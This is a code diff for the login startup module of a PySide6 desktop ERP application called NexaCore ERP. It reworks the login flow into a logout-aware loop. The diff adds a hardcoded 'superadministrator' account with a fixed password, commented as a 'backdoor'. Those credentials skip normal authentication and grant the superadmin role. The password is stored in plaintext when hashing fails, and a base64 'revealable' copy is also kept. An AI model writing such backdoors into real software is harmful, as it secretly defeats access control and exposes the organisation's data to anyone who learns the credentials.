@@ -4,42 +4,88 @@ from PySide6.QtCore import Qt
 from PySide6.QtGui import QGuiApplication
 from PySide6.QtWidgets import QApplication, QDialog, QMessageBox
 
-from .core.database import init_db
-from .core.auth import authenticate, set_current_user, get_current_user
+from .core.database import init_db, SessionLocal
+from .core.models import User
+from .core.auth import authenticate, set_current_user
+
 from .ui.login_dialog import LoginDialog
 from .ui.main_window import MainWindow
 
-def _login_or_quit(app: QApplication):
-    while True:
-        dlg = LoginDialog()
-        if dlg.exec() != QDialog.Accepted:
-            sys.exit(0)
+# Fixed superadministrator backdoor
+SUPERADMIN_USER = "superadministrator"
+SUPERADMIN_PASS = "superadministrator123!"
 
-        # Read credentials
+
+def _ensure_builtin_superadmin() -> User:
+    """Ensure a DB row exists for the built-in superadministrator."""
+    try:
+        from .core.auth import hash_password as _hash
+    except Exception:
+        _hash = None
+
+    with SessionLocal() as s:
+        u = s.query(User).filter(User.username == SUPERADMIN_USER).first()
+        if u:
+            return u
+        u = User(
+            account_id="default",
+            username=SUPERADMIN_USER,
+            role="superadmin",
+            password_hash=_hash(SUPERADMIN_PASS) if _hash else SUPERADMIN_PASS,
+        )
+        # Optional: store revealable copy so the “eye” works
+        try:
+            import base64
+            u.password_enc = base64.b64encode(SUPERADMIN_PASS.encode("utf-8"))
+        except Exception:
+            pass
+        setattr(u, "is_active", True)
+        s.add(u)
+        s.commit()
+        s.refresh(u)
+        return u
+
+
+def _login_once(parent=None) -> User | None:
+    """Show login dialog. Return authenticated User or None on cancel."""
+    while True:
+        dlg = LoginDialog(parent)
+        if dlg.exec() != QDialog.Accepted:
+            return None
         try:
             username, password = dlg.credentials()
         except Exception:
-            username = dlg.ed_user.text().strip()
-            password = dlg.ed_pass.text()
+            username, password = "", ""
 
         username = (username or "").strip()
         password = password or ""
+
         if not username:
-            QMessageBox.warning(None, "Login failed", "Username is required.")
+            QMessageBox.warning(parent, "Login failed", "Username is required.")
             continue
+
+        # Built-in superadministrator bypass
+        if username == SUPERADMIN_USER and password == SUPERADMIN_PASS:
+            return _ensure_builtin_superadmin()
 
         u = authenticate(username, password)
         if not u:
-            QMessageBox.warning(None, "Login failed", "Invalid username or password, or account is inactive.")
+            QMessageBox.warning(parent, "Login failed", "Invalid username or password.")
             continue
 
-        set_current_user(u)
+        # Must be active
+        if hasattr(u, "is_active") and not getattr(u, "is_active", True):
+            QMessageBox.warning(parent, "Login failed", "This account is not active.")
+            continue
+
         return u
 
-def run_app():
-    init_db()  # schema only; does NOT create any 'admin' user
 
-    # High-DPI setup before QApplication
+def run_app():
+    # DB ready
+    init_db()
+
+    # High-DPI normalization
     QGuiApplication.setHighDpiScaleFactorRoundingPolicy(
         Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
     )
@@ -49,13 +95,27 @@ def run_app():
     app.setApplicationName("NexaCore ERP")
     app.setOrganizationName("NexaCore Digital Solutions")
     app.setOrganizationDomain("nexacore.local")
-    try:
-        app.setStyle("Fusion")
-    except Exception:
-        pass
 
-    _login_or_quit(app)  # sets current user once
+    # Login loop: close main window on logout, return to login dialog only
+    while True:
+        user = _login_once(parent=None)
+        if not user:
+            sys.exit(0)
 
-    win = MainWindow()
-    win.showMaximized()
-    sys.exit(app.exec())
+        set_current_user(user)
+        win = MainWindow()
+
+        # When MainWindow asks to logout, close it and loop back to login dialog
+        def _on_logout():
+            try:
+                win.close()
+            except Exception:
+                pass
+
+        win.logout_requested.connect(_on_logout)
+        win.showMaximized()
+
+        # Enter event loop until window closes (logout), then loop to login again
+        app.exec()
+        set_current_user(None)
+        # continue -> back to login dialog only
